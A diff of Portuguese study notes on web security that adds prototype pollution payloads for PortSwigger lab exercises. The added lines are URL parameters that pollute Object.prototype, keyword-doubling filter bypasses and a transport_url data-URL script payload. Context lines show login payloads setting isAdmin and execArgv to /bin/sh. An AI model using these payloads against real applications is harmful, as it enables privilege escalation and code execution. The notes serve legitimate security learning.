@@ -9392,9 +9392,15 @@ Pra saber se um servidor tem falha de prototype pollution, teste enviando dados 
 
 Alguns payloads que podem ser inseridos nos campos login e senha com o intuito de explorar a vulnerabilidade de protorype pollution. O primeiro payload é para teste, quando rodar, verificar no console o `Object.prototype` e ver se vai modificar o objeto com o nome `foo` e o value `bar`
 
-	EXEMPLO DE LOCAL ONDE PODE SER INSERIDO UM PAYLOAD - RODAR NO CONSOLE Object.prototype E VER SE VAI APARECER foo...bar NO OBJETO
+	EXEMPLO DE PAYLOADS QUE PODEM SER INSERIDOS DIRETO NA URL - RODAR NO CONSOLE Object.prototype E VER SE VAI APARECER foo...bar NO OBJETO
 	academy.net/?__proto__[foo]=bar
 	academy.net/?__proto__.foo=bar
+	academy.net/?constructor.prototype.foo=bar
+	academy.net/?constructor.prototype.[foo]=bar
+	academy.net/?__pro__proto__to__[foo]=bar
+	academy.net/?__pro__proto__to__.foo=bar
+	academy.net/?constconstructorructor[protoprototypetype][foo]=bar
+	academy.net/?constconstructorructor.protoprototypetype.foo=bar
 	PAYLOADS PARA LOGIN
 	{\"__proto__\": { \"isAdmin \": true }}
 	{\"__proto__\":{\"execArgv\":[\"/bin/sh\"]}}
@@ -9427,7 +9433,7 @@ LABS
 
 [DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector) PAYLOAD `?__proto__.sequence=alert(1) -` COM EVAL no JS que não ta definido. O traço no fim é um comentario por conta do erro que gera no console
 
-[Client-side prototype pollution via flawed sanitization](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)
+[Client-side prototype pollution via flawed sanitization](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization) PAYLOAD `?constconstructorructor[protoprototypetype][transport_url]=data:,alert(2);` na mesma propriedade do primeiro lab, bypassando o filtro de parametros bloqueados
 
 SOP - Same Origin Policy
 É quando o site permite ou/não a "interação" com outros sites
